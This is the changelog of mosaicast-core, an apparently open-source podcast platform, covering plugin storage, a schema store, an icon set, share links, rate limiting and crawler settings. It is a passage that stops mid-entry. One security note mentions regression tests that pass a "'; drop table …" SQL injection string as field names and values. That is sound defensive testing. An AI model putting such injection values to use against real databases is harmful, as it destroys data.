<!--
SPDX-License-Identifier: AGPL-3.0-or-later
SPDX-FileCopyrightText: 2026 The Mosaicast Authors
-->

# Changelog

All notable changes to **mosaicast-core** are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow
[Semantic Versioning](https://semver.org/). The minor version tracks the build milestone
(M1 = `0.1.x`, M2 = `0.2.x`, …) and is independent of the plugin-contract (SDK) version.

## [Unreleased]

### Added

- **A generated icon set, shared with plugins through the theme tokens (`0.6.15`, §12.3).** The shell drew
  its symbols as literal characters — `🟢` for WhatsApp in the share sheet, plus `▶ ❚❚ ↺ ↻ ⓘ ⚠ ▾ ↗ ⇪`
  across the player, chrome and admin. Emoji are rendered by the platform, so the same markup was different
  artwork on every OS, could not take a theme colour and could not be optically aligned. There is now one
  `<Icon>` component, generated from a whitelist (`frontend/dev/icons.txt` → `npm run icons`) out of
  Bootstrap Icons, drawing in `currentColor` and sizing in `em`. A deliberate **public subset is published
  as `--mc-icon-*` custom properties**, which inherit across the shadow boundary exactly as the colour
  tokens do — so a plugin's Web Component can use the shell's icons with no SDK import, no `platformApi`
  bump and no version skew, and every plugin UI re-themes with the same drawings. Used as a mask
  (`mask-image` + `background: currentColor`), never as a background image, so an icon takes the caller's
  own colour. Published names are a contract: add freely, rename never.
- **The icon palette is provisioned ahead of demand — 142 icons, all public (`0.6.15`, §12.3).** Core draws
  seventeen of them; the rest exist because a plugin lives in its own repo and builds against a *released*
  core, so an icon that is not already published is one its author cannot add — they wait for a core
  release. The groups are aimed at the plugins we know about and the obvious next one: charts, percent and
  stopwatch for **stats**; document, journal, history, structure and link for **wiki**; grid, board, trophy
  and dice for **bingo**; `choice-single`/`choice-multi` (drawn *as* radio and checkbox controls),
  checklist, thumbs-up/down and quiz for a **poll** plugin.
- **Two whitelist tiers, so the palette costs the JS bundle nothing (`0.6.15`).** `+` publishes an icon as
  a `--mc-icon-*` property and leaves it out of `Icon.tsx`; `*` does both. A `+` icon is **not** second
  class — core and plugins alike use it from any stylesheet as `mask-image` + `background: currentColor`,
  which is how the shell's own dropdown caret is drawn. `*` is only for what a mask genuinely cannot do: a
  name that varies at runtime, an icon needing an `aria-label` (a pseudo-element is invisible to assistive
  tech), or standalone markup. Sixteen icons qualify; the other 126 ride the stylesheet. Bundle: JS
  126.5 kB gzipped (unchanged from the seventeen-icon set), CSS 8.9 → 30.0 kB.
- **CI fails a PR whose generated icons disagree with their whitelist (`0.6.15`).** The generator runs in CI
  and the result is diffed. An edited whitelist that was never regenerated is caught on the PR, where the
  author can still fix it, rather than repaired afterwards by a bot commit nobody reviewed and CI never ran
  against.
- **A changelog check (`0.6.15`).** A PR touching `src/main/`, `frontend/src/` or `plugins/` must also touch
  `CHANGELOG.md`, escapable with the `no-changelog` label. Entries written while the change is fresh are the
  only ones that stay specific; reconstructing them at release time from a diff is how they go vague.
- **`THIRD-PARTY-NOTICES.md` (`0.6.15`).** Bootstrap Icons ships inside the bundle, so its MIT copyright and
  permission notice ship with it — minifiers strip comments, so the binding copy lives in a file the
  generated headers point at. Also records that the WhatsApp and Telegram marks are used nominatively: an
  MIT or CC0 licence covers copyright in a drawing and grants no trademark rights, and no licence could.

### Changed

- **`.mc-menu__label::after` draws the dropdown caret as a mask instead of the `▾` glyph (`0.6.15`).** Same
  drawing as everywhere else in the shell, and it takes the trigger's own colour rather than whatever the
  platform font decides.

## [0.6.14] — 2026-08-18

> Closes everything accumulated since `0.4.2`. Each entry keeps the `(0.6.x)` label of the
> version it actually shipped in — that is the fine-grained record; this heading is the
> release that draws a line under all of it.

### Changed

- **`BlobStore` is now an abstraction a second backend could actually implement (`0.6.14`, §11).** §11 has
  always said "one interface, one backend per namespace — `branding/*` may stay in Postgres, `audio/*` later
  S3/CDN". It was not true yet, and the gap was not visible from the interface:
  - **The plugin surface reached past it.** `PluginBlobService` queried `BlobRepository` directly for
    listing, counting, quota and purge. A non-Postgres backend would have accepted uploads and then reported
    an empty media library and **zero usage** — the quota silently unenforced, nothing failing loudly.
    Those four now live on `BlobStore`, and a backend answers for its own namespaces.
  - **The router could not be configured.** It was constructed with `Map.of()` hardcoded, so per-namespace
    routing was a shape rather than a setting. Backends now register by name (`NamedBlobStore`) and
    `mosaicast.blobs.namespaces` points namespaces at them — exact match first, then longest `/` prefix, so
    `plugin` covers every plugin without naming ones that are not installed yet. A rule naming an
    unregistered backend **fails startup** rather than falling through to the default: a typo would
    otherwise put files in a store nobody chose, and the symptom appears long after the cause.
  - **`urlFor` was a dead contract.** It returned `/api/blobs/{id}` for a route nothing has ever mapped —
    satisfied-looking, and a 404 to the first caller who believed it. Replaced by
    `Optional<String> directUrl(ref, ctx)`, where empty means "serve the bytes yourself" (Postgres always
    does) and a value is the CDN/presigned URL that makes an object store worth having at all. It takes an
    `AccessContext` because tier-gated audio (§10) must be signed *after* the entitlement check.
  - **Self-contained backends, not a shared Postgres index.** Two stores of the same truth can disagree and
    nothing can then say which is right. The cost is that each backend owes good answers to `usedBytes` and
    friends — Postgres sums an indexed column, an object store will keep a counter rather than paginate its
    own prefix on every upload — and that is the backend's problem rather than the interface's.
  - **Proven by a second implementation**, in tests: an in-memory backend, a namespace routed to it, and the
    whole plugin surface driven over HTTP against it. An abstraction with one implementation is an
    assertion; every gap listed above was found by writing that test, not by reading the interface.

  - **Branding is guarded to Postgres at startup.** `site_config.*_asset_id` is
    `UUID REFERENCES blob(id)`, so a branding asset's pointer is a row id in the Postgres `blob` table —
    routing that namespace elsewhere creates no such row and the upload dies on the constraint. Making
    routing configurable made that reachable from a config line that reads as reasonable, so it now fails at
    startup naming the setting, rather than at the next logo upload naming a foreign key.

  No behaviour changes: Postgres remains the only registered backend and the default. What changed is that
  adding a filesystem or object-store backend is now a new class plus a config line rather than a refactor.
  *Known deferral:* listing stays offset-paged, which an object store pages badly. Moving to cursor paging
  is an SDK contract change and belongs with the backend that needs it.

### Added

- **A plugin's storage limits are editable per plugin in admin (`0.6.13`, §11.1).** `0.6.11` shipped them
  configurable only through `mosaicast.plugin-blobs.*` — one number for every plugin on the install, changed
  by redeploying. That is the wrong shape for what it governs: a wiki accumulating diagrams and a bingo
  plugin storing nothing have no reason to share a ceiling, and "the wiki has outgrown its space" is an
  ordinary operational event rather than an infrastructure change.
  - **An admin's grant replaces the manifest's ask rather than being minimised with it**, which is the part
    worth reading twice. A manifest says what a plugin's author guessed it would need on an install they
    have never seen; an admin raising it is looking at this install's real usage. Under the old
    `min(manifest, operator)` an admin granting 2 GB against a manifest asking 256 MB would have got 256 MB
    and no explanation — a control that appears to work and silently does nothing. The manifest still
    decides when nobody has said otherwise.
  - **The properties split in two**, because one number was doing two jobs. `default-quota-bytes` /
    `default-max-file-bytes` are what a plugin gets when nobody has said otherwise; `hard-quota-bytes` /
    `hard-max-file-bytes` are the most an *admin* may grant and are **unset by default**, i.e. the admin
    decides. They exist because ADMIN is a role inside the application (§8.5) while these are
    infrastructure — where those are not the same person, an operator needs a bound the UI cannot cross. A
    grant past a ceiling is **clamped, not refused**, and the clamped value is stored, so an admin is never
    shown a number that means something else.
  - **The MIME allow-list stays operator-only.** No grant widens it: what a file may *be* is a security
    question (§12.2), not a capacity one.
  - The panel is **ADMIN-only**, unlike `/config`, which is open to PODCASTER for per-field delegation —
    how many gigabytes a plugin may occupy is a decision about someone else's server. It leads with current
    usage and file count, since that is what prompts raising a limit, and a limit set *below* what is
    already stored is allowed with a warning: nothing is deleted, further uploads fail until files are
    removed, and refusing it would mean the only way to signal "shrink" is to delete someone's files first.

- **A share dialog on episodes, feed tabs and the site panel (`0.6.12`,
  [#82](https://github.com/Mosaicast/mosaicast-core/issues/82), §6.4).** `0.6.9` made a timestamped link
  *work*; without a way to produce one, only people who already knew the trick would ever have used it. The
  dialog is the familiar one: prepared destinations, the link itself in a field with a copy button, and — on
  an episode — a **start-at row prefilled with wherever the player currently is**, editable to any other
  moment, off by default.
  - **The prepared destinations are WhatsApp, Telegram, Email, plus the OS share sheet where the browser has
    one.** Every one is a plain outbound link the visitor clicks: nothing loads a third-party script, embeds
    a widget or makes a request before the click, so this surface makes **no consent decision** (§12.5),
    needs no CSP host and stores nothing on the device. A share button that phones home before anyone shares
    is what the consent service exists to prevent.
  - **The social networks are deliberately absent as buttons and unaffected as destinations.** A link pasted
    into any of them still renders a correct card — that is `0.6.9`'s OG work doing its job, and it needs no
    button here.
  - The prefilled time is **captured when the dialog opens**, not tracked live: a field that moved under the
    cursor while the episode played would be unusable. A time the parser cannot read marks the field invalid
    and falls back to sharing the episode — better a link to the episode than a link to a moment that does
    not exist.
  - A feed or site share carries **the filter query that was showing** (§6.1), since a filtered view is part
    of what was being shared; an episode share does not, because nothing else on an episode URL is.
  - New `Modal` primitive (scrim, sheet, Escape, focus in and back out again) and a `styles/share.css`
    partial holding it. The consent dialog predates it and is left alone — it is a surface with its own
    layout, not a reason to churn those styles.

- **Plugins can store files: `POST /api/plugins/{id}/blob` and `ctx.blobs` (`0.6.11`,
  [#81](https://github.com/Mosaicast/mosaicast-core/issues/81), §11).** A plugin could declare relational
  tables, publish documents and serve a deep-linked page, and could not store a **file**. `BlobStore` had
  existed since branding shipped and had exactly one caller. The asymmetry that left is the point of the
  issue: `PluginCspHeaderWriter` gives `img-src`/`media-src` a blanket `https:`, so a plugin could display an
  image from *any* host on the web — and had no way to accept one from the site's own podcaster.
  - **Opt-in through a new manifest `blobs` block** (`maxFileBytes`, `quotaBytes`, `mimeTypes`). Declared,
    never derived — the same rule as the data floors, so a plugin's appetite for disk is something whoever
    installs it can read off the manifest. Without it, `ctx.blobs` is `null` and all five endpoints answer
    **404**, indistinguishably from an unknown or switched-off plugin.
  - **The operator's numbers win.** `mosaicast.plugin-blobs.*` caps both ceilings and holds the allow-list a
    plugin's declared types are intersected with; the effective value is the smaller of the two, and
    `GET .../blob/quota` is the only honest source for what was actually granted. A plugin asking for more
    than an install allows is granted less, never rejected — its portability should not depend on the most
    restrictive install it might ever meet.
  - **Writes are the point here, unlike the schema surface.** The argument against schema writes over HTTP
    is that no plugin code runs at request time to enforce a relational invariant. A file has none, so
    `data.writableBy` plus a quota is the whole authorization story and a plugin's editing UI uploads
    directly. Reads take `data.readableBy` — one floor pair, now three surfaces. `backendOwned` does not
    apply: it reserves *keys*, and a caller never names one here (a ref is a UUID the host mints per upload,
    so an upload cannot overwrite an existing file, including another tenant's).
  - **What the bytes say is what gets stored.** Size, then the declared type against the allow-list, then
    the *actual* type read from the leading bytes, then the quota. `MimeSniffer` is extracted from
    `BrandingService` and shared, so there is one place that decides what a file is; SVG has no case in it,
    which is what makes it unstorable rather than merely undeclared. A refusal answers **415** (type) or
    **413** (size or quota) with distinct problem `type`s, worded apart because the fixes differ.
  - **Range requests and ETags from day one** (§11), on the streaming reads `BlobStore` already had —
    `Accept-Ranges`, `206` with `Content-Range`, and immutable caching, since a ref is never reused. Blobs
    are served **same-origin** under `/api/`, so a plugin rendering its own upload needs no CSP host and
    makes no consent decision, which an external image URL cannot say.
  - **Purge takes files with it** (§7.8), matched on the namespace exactly rather than on a name prefix —
    the distinction `V23__plugin_schema_registry.sql` already makes for tables. A purge that left uploads
    behind would be the half-purge the schema work called out.
  - **Two config changes worth knowing about.** The global `spring.servlet.multipart.max-file-size` rises
    from 2 MB to 12 MB so it clears the plugin ceiling — it is not the effective cap for anything (branding
    still enforces its own 2 MB in code), it only means a refusal comes from code that can say which rule
    refused it. And plugin blob writes join the upload rate-limit bucket, matched by path *shape*
    (`/api/plugins/*/blob`) so ordinary doc-store writes stay out of a bucket sized for files.
  - Also: `ctx.links.episode/feed`, the host's own URL shapes as plain string builders. Not a capability — a
    plugin could always write any `href` — but `ctx.route.navigate` is namespace-confined by construction, so
    a plugin linking to an episode previously hardcoded `/episodes/${slug}` and became a thing that breaks
    when a route changes.

- **An episode link can point at a moment: `/episodes/{slug}?t=754` (`0.6.9`,
  [#82](https://github.com/Mosaicast/mosaicast-core/issues/82), §6.4/§6.5).** Every podcast player people
  are used to supports this, and the machinery was already half-built — `PlayerContext` has kept a deferred
  seek applied on `loadedmetadata` since the player shipped. What was missing was the wiring from the URL to
  it, and a server that knew the parameter existed.
  - **The grammar is what people actually paste**: bare seconds (`754`), the clock a player shows (`12:34`,
    `1:02:03`), and the unit form other apps emit (`1h02m03s`, `90m`). An unparsable value is **dropped, not
    rejected** — a mangled timestamp in a forwarded link should still open the episode. The rule lives twice,
    in `frontend/src/util/timestamp.ts` and `web/TimestampParam`, held to one table of cases by both test
    suites: the shell decides where playback lands and the server decides what the card says, and a link
    that previews as one moment and plays another is worse than one carrying no timestamp at all.
  - **An explicit `t` beats stored listening progress, and does not overwrite it** (§6.5). Someone following
    a link asked for that spot; someone who was halfway through the episode did not ask to lose their place.
    The position is only written back once playback has actually advanced five seconds past the shared one —
    the difference between having looked and having listened. Scrubbing by hand ends the hold immediately,
    since that is a deliberate statement about where the listener is.
  - **`rel=canonical` and `og:url` are now allowed to differ**, which is the one judgement call here. A
    timestamp is a position within a page rather than a page of its own, so the canonical URL stays the bare
    episode and the filter-normalizing rules of §6.1 are untouched. But emitting that as `og:url` would let a
    scraper normalize a shared moment back to the top of the episode — exactly the link the sharer did not
    send — so `og:url` carries what was shared. Only a value that survives parsing is re-serialized into the
    page, so no input string reaches the HTML on this route.
  - **Richer preview tags, because a link is pasted into a messenger far more often than into a search box.**
    Episodes now declare `og:type: article` with `article:published_time`, `og:audio`/`og:audio:type` when
    the enclosure's format can be told from its URL, and every view carries `og:site_name`, `og:locale` and
    `og:image:alt`. *Known limit:* episode artwork comes from the feed as an external URL, so
    `og:image:width/height` cannot be emitted and a show with very large artwork may still render a small
    card in WhatsApp — that is a property of the feed, not something this can fix.

### Fixed

- **A branding upload could store a format the allow-list does not name (§12.2).** The check was "declared
  type is allowed" then "the bytes are *some* recognised format" — which held only while the sniffer knew
  exactly the four types branding accepts. Sharing it with plugin uploads broke that coincidence, so the
  sniffed type is now checked against the allow-list too. Reachable before this release only by declaring
  `image/png` and sending something else the sniffer would have recognised.

### Changed

- SDK bumped to **0.8.0** (`platformApi` matches `major.minor` exactly, so every plugin manifest moves with
  it — the bundled fixtures are updated here).

### Added

- **The schema store has an HTTP surface: a plugin frontend can query its own tables (`0.6.8`,
  [#76](https://github.com/Mosaicast/mosaicast-core/issues/76), §7.6).** `0.6.6` shipped the schema
  provider's provisioning half — the manifest declares entities, the host creates
  `plugin_<id>_<entity>` with the indexes asked for — but `SchemaStore` was reachable only from a plugin's
  Java backend. So the GIN index the platform builds for full-text search existed for a search box that
  had no way to reach it, and the capability had no consumer that could ship. Four read endpoints, mapping
  one-to-one onto `SchemaStore`:
  ```text
  GET /api/plugins/{id}/schema/{entity}?where=&orderBy=&page=&size=
  GET /api/plugins/{id}/schema/{entity}/search?field=&q=&where=&orderBy=&page=&size=
  GET /api/plugins/{id}/schema/{entity}/count?where=
  GET /api/plugins/{id}/schema/{entity}/{rowId}
  ```
  - **No new injection surface.** `SchemaStoreImpl` already resolved every entity and field name against
    the plugin's own manifest and bound every value as a JDBC parameter, so the new layer only parses a
    `Criteria` out of `where=field:op:value` / `orderBy=field:asc|desc` terms. It is schema-*aware* because
    it has to be: a value arrives as text and JDBC binds by column type, so `views:gte:30` becomes a `Long`
    against the declared type, and a value that cannot be read as that type is a **400** rather than a
    driver error at 500.
  - **The manifest's `data.readableBy` governs it**, the same floor as the doc surface — one rule, two
    surfaces. There is no scope in these paths (schema tables are per plugin), so there is no `USER`-scope
    exemption to make. An undeclared **entity** is a 404 (over HTTP it is a path segment, i.e. an address);
    an undeclared **field**, an unreadable value or `search` on a field that is not `:fulltext` is a 400. A
    doc-store plugin and a switched-off one both answer 404, indistinguishably.
  - **Writes stay out, deliberately.** A v1 plugin authors no HTTP routes, so there is no request-time hook
    where plugin code could enforce slug uniqueness or append a revision atomically — exposing writes would
    hand clients direct row access with no plugin code in the path. The backend remains the only writer of
    relational truth; a frontend that must write puts a document in the doc store and the backend ingests
    it on its schedule, which makes such a write eventually consistent.

- **`ctx.route.navigate(...)`: a page plugin can move without reloading the page (`0.6.8`,
  [#77](https://github.com/Mosaicast/mosaicast-core/issues/77), §6.4).** `ctx.route` was read-only, so a
  plugin owning `/p/<pluginId>/*` had no supported way to follow its own links: an `<a href>` re-fetched
  the shell, the plugin registry and every plugin bundle per click, and the alternative that *worked* —
  `history.pushState` plus a synthetic `popstate` — silently coupled plugins to the host's router. The new
  handle is real SPA navigation through the shell's own router, and it is namespace-confined host-side: a
  leading `/` is stripped and `..` segments are dropped, so another plugin's route or a core one is not
  blocked so much as unnameable.

- **`ctx.schema` on the frontend context (`0.6.8`).** `null` unless the manifest declares `storage.schema`,
  mirroring the backend's `ctx.schema()` — a doc-store plugin gets nothing rather than a client that would
  404 on every call. The public manifest gained `hasSchema` so the shell knows which to build.

### Changed

- **`platformApi` is now `0.7.x` (`0.6.8`).** The host builds against SDK **0.7.1** and matches
  `major.minor` exactly, so **every plugin declaring `0.6.x` is rejected at load** until it re-declares —
  while anything on `0.7.0` or `0.7.1` loads either way. No plugin *code* changes; the one compile break is
  a test that hand-builds a `route` override, which SDK 0.7.1 removes the need for. See the SDK's
  `MIGRATION.md`.

- **The list-endpoint page cap lives on `PagedResponse` (`0.6.8`).** `MAX_PAGE_SIZE = 200` plus `page()`
  and `size()` normalizers, shared by the doc and schema surfaces, so a caller learns paging once and the
  number has one home.

### Fixed

- **A plugin's extension points ran on a different object than `register(ctx)` (`0.6.7`, §7.4).** PF4J's
  default `ExtensionFactory` constructs a **fresh instance per extension-point lookup**. A plugin class
  implementing `PluginBackend` alongside `ShareMetadataProvider` and/or `SitemapProvider` — which §7.4
  invites, and the bundled sample does — therefore became two or three unrelated objects: the host called
  `register(ctx)` on one and asked the others for sitemap entries and OG tags, with their context field
  never set.
  - The symptom was **silence**: a `sitemap.xml` missing every plugin URL, and `/p/<id>/…` falling back to
    site-level OpenGraph. A plugin that dereferenced the field instead of null-checking it got a
    `NullPointerException` from a call it never made.
  - The sample plugin had worked around it by making its context `static` and documenting the trap at
    length — a workaround every plugin author would have had to rediscover the same way, by shipping
    something that quietly did nothing. Nothing in the SDK contract says an extension point runs on a
    different object than `register`.
  - Fixed in the host with PF4J's own `SingletonExtensionFactory`, so the object the host registered is the
    object it later asks. The fixture plugin now stores its context in a **plain instance field** and
    contributes a URL only if `register` ran on that same object, which is the regression test — it fails
    against the old factory.

- **The header overflowed its own width on a phone (`0.6.7`).** Brand, language, info and account were all
  rigid, so below ~430px the account menu was pushed off the right edge and clipped. The elastic parts now
  give way in order: the language label shortens to its code, the wordmark steps aside (the logo is the
  link home and is already tappable), then a long display name truncates. The controls themselves never
  shrink, so they stay tappable. Verified from 320px to 1280px across home, detail, account and admin.

- **The admin area on a phone was a wall of navigation (`0.6.7`).** The side nav simply stacked above the
  panel, so eight sections cost ~350px — over 40% of a phone screen — before a single setting was visible.
  It is now a horizontally scrollable tab strip, matching the per-feed tabs the shell already uses (§6.1),
  sticky under the top bar so switching sections never means scrolling back up, and it scrolls the active
  section into view on arrival. Nav height 354px → 48px.

- **The dev screenshot stack advertised the wrong host (`0.6.7`).** It serves on `:8081` while
  `mosaicast.base-url` defaulted to `:8080`, so every `<loc>` in its `sitemap.xml`, its `robots.txt` sitemap
  reference and every canonical pointed at a port nothing was listening on. It now passes its own URL.

### Changed

- **The wordmark is the link home; the separate nav item is gone (`0.6.7`).** The brand was already a link
  to `/`, so the one-item nav beside it was a second link to the same place — and it cost a whole row of
  header on a phone to say it twice.

### Added

- **The schema provider: plugins can declare relational tables (M6, `0.6.6`, ARCHITECTURE §7.6).** The SDK
  has shipped `SchemaStore`, `Criteria` and `FakeSchemaStore` since `0.4.0`, and the host answered
  `ctx.schema()` with `null` and rejected any manifest that declared one. A plugin could write and test the
  code but never run it — which is what blocked the wiki.
  - **The manifest's `storage` now takes both shapes** the spec gives it: the string `"doc"`, or
    `{ "schema": { "page": { "slug": "string:indexed:unique", … } } }`. Types are `string` `text` `integer`
    `number` `boolean` `timestamp`; modifiers are `:indexed` `:unique` `:fulltext` (the last only on text).
  - **A closed grammar, because it is the whole boundary between a manifest and DDL.** Entity and field
    names must match a pattern with no quote, space or hyphen in it, every generated identifier is emitted
    double-quoted, and anything outside the known types and modifiers **rejects the plugin at load** rather
    than being coerced into something that runs. Quoting is also what keeps `updatedAt` from being folded to
    `updatedat` and silently breaking the record mapping.
  - **A platform migration runner, not Flyway** — Flyway applies a fixed set of scripts shipped with the
    release, and a plugin's tables are neither. DDL is applied programmatically with the host's own
    bookkeeping table (`plugin_schema_table`, Flyway `V23`), which is also how purge knows what to drop:
    choosing tables to `drop` by name prefix is one naming accident away from taking something else.
  - **Additive only.** A new field is added on the next boot; a field dropped from the manifest leaves its
    column alone; a field whose declared type changed **refuses the plugin** rather than retyping a column
    that already holds data. That is not a decision a runner should make on an admin's behalf because a
    manifest changed between two boots.
  - **The scoping story is that a plugin cannot express the question.** `SchemaStoreImpl` resolves every
    entity and field name against that plugin's own declaration and builds the statement itself; values are
    always bound as JDBC parameters. Reaching another plugin's tables, or core's, is not blocked so much as
    unsayable — pinned by tests that pass `plugin_data` as an entity and a `'; drop table …` string as both
    a field name and a value.
  - Full-text search runs on the provisioned GIN index via `websearch_to_tsquery`, which takes what a person
    would type and never throws on syntax — a plugin passes its users' words straight through, and a parse
    error from a stray operator would surface as a 500 inside that plugin's UI.
  - **Purge now removes both storage kinds** (§7.8): documents *and* the provisioned tables. A half-purge is
    the worse outcome either way round — documents left behind reappear under a reinstalled plugin, and
    tables left behind make a re-provision fail on a type that has since changed.
- **Related episodes, with podcaster-curated pins (M6, `0.6.5`, ARCHITECTURE §6.3).** §6.3 has specified a
  `RelatedProvider` since the start and nothing implemented it; the detail sidebar was empty on any install
  without a sidebar plugin, which is every install by default.
  - **A swappable strategy, not a plugin.** `RelatedProvider` is a one-method interface the host resolves,
    because the sidebar has to work with zero plugins installed. §6.3 already names the v2 successor — an
    embedding strategy over `pgvector`, or a recommender — and both replace `DefaultRelatedProvider` without
    the endpoint or the widget changing.
  - **Pins win, and are not scored.** A pin is an answer, not a signal: it is emitted first, in the curated
    order. Scoring it and having it land third would make the curation look broken.
  - **Then the three signals §6.3 names**, weighted: same season (scaled by how near in episode number),
    shared tags (with diminishing returns — the fifth shared tag adds little), fuzzy title (weakest, and
    deliberately so; it catches "Part Two" and little else). Reuses `TitleSimilarity` from the reconciler
    rather than growing a second matcher.
  - **Same-feed is a tie-breaker, never a qualifier.** At least one substantive signal has to fire. Letting
    the feed bonus stand alone made every episode of a show "related" to every other, which on a small site
    fills the sidebar with the back catalogue and tells a listener nothing. An empty sidebar is a better
    answer than a dishonest one — and the widget renders nothing at all rather than a heading over an empty
    list.
  - **Excluded:** the episode itself, `PLANNED` (no audio) and `WITHDRAWN` (gone), and anything in a
    switched-off feed. A pin to an episode that has since become invisible is filtered from the public read
    but still listed for the admin, who has to be able to unpin it — a pin records an intention, not a
    permission.
  - **Curation is inline on the episode**, for PODCASTER and ADMIN (`/api/admin/episodes/{slug}/pins`), not
    in the admin area: the judgement is about *this* episode and is made while looking at it. Every mutation
    invalidates the cache immediately, because a pin that only took effect at the next poll would look
    broken to the person who just made it.
  - **Computed on request and cached** (§6.3), dropped wholesale when a poll changes the episode set — a new
    episode is a new candidate for every episode sharing a tag with it, and working out which cached answers
    moved costs more than recomputing the few that get asked for.


- **Basic rate limiting on auth endpoints and uploads (M6, `0.6.4`, ARCHITECTURE §13).** §13 has asked for
  this since the start and only `PluginLogRateLimiter` existed, which throttles plugin logs. Nothing stood
  between a script and `/api/auth/dev-login`, the OAuth2 endpoints, token minting or branding upload.
  - **Two buckets, because the two abuses look nothing alike.** A flood of logins is credential stuffing
    (20/minute per client by default); a flood of uploads is a disk and bandwidth problem (10/minute). One
    shared number would have been wrong for at least one of them. Both configurable under
    `mosaicast.rate-limit`, and the whole thing switchable off for an operator who front-ends the app with
    their own limiter.
  - **A servlet filter at `HIGHEST_PRECEDENCE`, not a check in the controllers**, because half the endpoints
    that need it are not controllers: `/oauth2/authorization/**` and `/login/oauth2/code/**` live inside
    Spring Security's chain, where a thrown exception never reaches `ApiExceptionHandler`. Running first
    also means a flood is refused before it costs a session lookup.
  - Refusals are RFC 7807 `problems/too-many-requests` with `Retry-After`, matching what the exception
    handler produces elsewhere — written by the filter itself, since `@ControllerAdvice` does not apply out
    there. **Only state-changing requests are counted**; a GET is never throttled, so the site cannot
    throttle itself.
  - `FixedWindowRateLimiter` decides inside **one** `compute`. `PluginLogRateLimiter` shipped as a `compute`
    plus a separate `put` and had to be fixed in `0.5.18` when a thread caught between them wrote a stale
    count over a fresh window, silencing a plugin for an extra minute. Built that way from the start here,
    with a concurrency test that asserts exactly the limit gets through, and an eviction sweep so the map
    does not grow one entry per address seen forever.
  - **What it is not:** a DoS control. The client key is whatever the deployment resolves the caller to, and
    with a directly exposed port that is caller-supplied — recorded as a known residual in `SECURITY.md`,
    along with why counting the socket address instead would be worse. Counters are per instance until Redis
    arrives at v3 (§13).
- **`robots.txt`, with the AI-crawler policy as an admin setting (M6, `0.6.3`, ARCHITECTURE §6.6).** The
  sitemap has been served since `0.5.5` with nothing pointing at it, and §6.6's other half — what the site
  asks crawlers to skip — did not exist. `GET /robots.txt` now disallows the admin/API/actuator paths,
  references the sitemap absolutely, and renders whatever the operator decided about AI crawlers.
  - **Three policies:** `allow` (say nothing — the default), `block` (disallow core's whole catalog), and
    `custom` (disallow exactly the agents the admin ticked). **`allow` is the default deliberately**: an
    install upgrading into this release has never expressed a policy, and silently starting to disallow
    crawlers it was already serving would be the migration making the decision the setting exists to leave
    open.
  - **Core ships a catalog, not an opinion.** `AiCrawlerCatalog` names 19 agents grouped by operator and
    purpose (training, search, user-triggered retrieval) — several companies run separate crawlers for
    each, and blocking a training crawler is a different decision from blocking a search one. §6.6 is
    explicit that this is the operator's call; the catalog is a convenience so nobody has to research
    user-agent tokens, and `custom` takes any string, including an agent that appeared after this release.
  - **New Admin → SEO & crawlers panel** (`GET`/`PUT /api/admin/seo`, ADMIN only), in English and German.
    It states plainly that **a robots.txt rule is a request, not a barrier** — a setting that reads like a
    lock and is not one is worse than no setting, and a test pins that sentence rather than leaving it to
    survive a copy edit.
  - Stored agent names are stripped of newlines on the way in *and* on the way out: `robots.txt` is
    line-oriented, so a newline in a stored value is the one character that could turn admin-supplied text
    into its own directive.
  - The base URL for the sitemap reference comes from configuration via `SiteUrls`, never the request —
    pinned by a test that sends `X-Forwarded-Host`, same as the sitemap and canonical.

- **The host's own pages are served with their metadata, structured data and readable content (M6, `0.6.2`,
  ARCHITECTURE §6.4/§6.6).** `IndexHtmlService` existed but `PluginPageController` was its only caller, so a
  shared *plugin* deep link previewed correctly while a shared **episode** link — the one the BRIEF's
  Definition of Done actually names — fell through to the static resource handler and got the bare bundle
  with a generic `<title>`. The new `ShellController` maps `/`, `/feeds/{slug}`, `/episodes/{slug}` and
  `/legal/{slug}`, and `OgResolver` answers each from the data the host already has.
  - **OpenGraph/Twitter per scope**, filters included: season and tag live in the query string (§6.1), so a
    shared filtered view previews as that view (`Feed – Season 2`) rather than as the site.
  - **JSON-LD**: `PodcastSeries` on the site and feed pages, `PodcastEpisode` on an episode — with its
    season, episode number, publication date and audio. Written by Jackson, never concatenated, and any
    `</` escaped on the way into the `<script>`: episode titles are third-party text, and one containing
    `</script>` would otherwise end the data block and have the rest of the document parsed as content.
  - **A no-JS content block** for crawlers that render nothing (most AI crawlers do not). It is injected
    *inside* `#root`, so React clears it when it mounts — there is no hand-off code to get wrong, and no
    path where a visitor sees the page twice. Show notes are sanitized with a Jsoup safelist that keeps text
    structure and drops `<img>`, which would otherwise be an arbitrary-origin request past §12.5's
    `img-src` narrowing.
  - **`rel=canonical` with normalized filters**, so `?tag=x&season=2`, `?season=2&tag=x` and
    `?season=2&tag=x&order=newest` are one URL rather than three — `order=newest` is what the shell assumes
    when the parameter is absent, so carrying it would canonicalize one view two ways.
  - **Real HTTP 404s** for an unknown episode, feed or legal-page slug (§6.6 — no soft-404). The body is
    still the shell, so a human lands on the app's not-found view; the *status* is what a crawler reads, and
    a 200 there is how a site gets its own not-found pages indexed.
  - **`SiteUrls`** now owns "the base URL comes from configuration, never from the request", extracted from
    `SitemapController` because the identical header-spoofing hole is worth exactly as much in a
    `rel=canonical` as it was in a `<loc>`. Pinned by a test that sends `X-Forwarded-Host`.
  - **Not yet, and deliberately** — the two remaining §6.6 hygiene items are each blocked on a decision, not
    on work, and both are flagged to ARCHITECTURE's owner rather than resolved here:
    - **`hreflang`** presumes a distinct URL per language version. Locale resolution is client-side (§12.7:
      an explicit choice in `localStorage`, then the browser, then the site default) and *one* URL serves
      both `en` and `de`, so the tags could only be emitted pointing every language at the same href —
      which search engines treat as an error rather than as an answer. Implementing it honestly means
      per-locale URLs, which is a routing change well outside a hygiene bullet.
    - **`<link rel="alternate" type="application/rss+xml">`** would publish a feed's source URL, which
      `PublicFeedView`/`FeedDetailView` deliberately withhold from unauthenticated callers ("must not leak").
      For a free RSS show that URL is already public and the tag is free discovery; for the tier-gated feeds
      §9 brings in v2 it is not. Reversing a deliberate exclusion is not a call to make in passing.

### Fixed

- **The detail sidebar no longer stacks underneath the show notes (`0.6.5`).** The two-column layout was
  gated on `:has(.mc-detail__side .mc-slot:not(:empty))` — a *plugin* slot with content. Core content in the
  sidebar did not match it, so the related list appeared below the notes at full width instead of beside
  them. The rule now opens for any sidebar content, and the mobile breakpoint closes all of them again.

### Security

- **A plugin's backend can reserve the keys it authors (`0.6.1`, §7.2/§7.6).** Authorization on the doc store
  is per *plugin*, not per *document*. The floors say who may write; nothing said which key, so every caller
